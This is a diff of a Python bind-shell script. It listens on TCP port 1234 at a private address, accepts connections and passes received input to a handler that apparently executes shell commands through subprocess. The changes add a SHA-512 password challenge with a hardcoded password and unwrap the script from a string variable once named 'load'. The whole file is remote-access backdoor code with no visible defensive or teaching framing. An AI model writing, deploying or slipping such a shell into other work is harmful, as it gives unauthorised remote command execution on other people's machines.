@@ -1,14 +1,41 @@
 
-
-
-
-
-load = """
-
 import os
 import socket
+import hashlib
 import threading
 import subprocess
+
+
+def passwordChallenge(channel, passwd):
+
+    bufferSize = BUFFER_SIZE
+
+    ciperPassword = hashlib.sha512(passwd.encode()).hexdigest()
+    while True:
+        rawHashPassword = channel.recv(bufferSize)
+        if len(rawHashPassword) < bufferSize:
+            break
+
+    # Decode bytes to str
+    hashPassword = rawHashPassword.decode()
+    
+    if hashPassword == ciperPassword:
+        response = hashlib.sha512(ciperPassword.encode()).hexdigest()
+        channel.sendall(response.encode())
+        challenge = True
+    
+    elif hashPassword != ciperPassword:
+        response = b' '
+        channel.sendall(response)
+        channel.close()
+        challenge = False
+
+    return challenge
+
+
+
+
+
 
 def serverHandler(channel):
 
@@ -18,7 +45,7 @@ def serverHandler(channel):
     
         try:
             # Define buffer size, can be increased
-            bufferSize = 1024
+            bufferSize = BUFFER_SIZE
             
             # While loop to complete socket buffer in recv 
             while True:
@@ -96,8 +123,12 @@ def shellCommand(command, cwd):
 # ------------------------------------------------------------------------------
 # ------------------------------------------------------------------------------
 
+BUFFER_SIZE = 1024
+
 bindPort = 1234
 bindAddress = '10.0.10.110'
+password = 'Py314!'
+#cipherPassword = hashlib.sha512(password.encode()).hexdigest()
 
 serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 serverSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -113,8 +144,13 @@ while True:
 
         channel, cliAddress = serverSocket.accept()
         print(f"[+] Received Connection from {cliAddress[0]}")
-
-        serverHandler(channel)
+        challenge = passwordChallenge(channel, password)
+        if challenge is True:
+            print('Password match')
+            serverHandler(channel)
+        elif challenge is False:
+            print("Password doesn't match")
+            channel.close()
 
 
     except KeyboardInterrupt:
@@ -127,4 +163,3 @@ while True:
         serverSocket.close()
         exit()
 
-"""
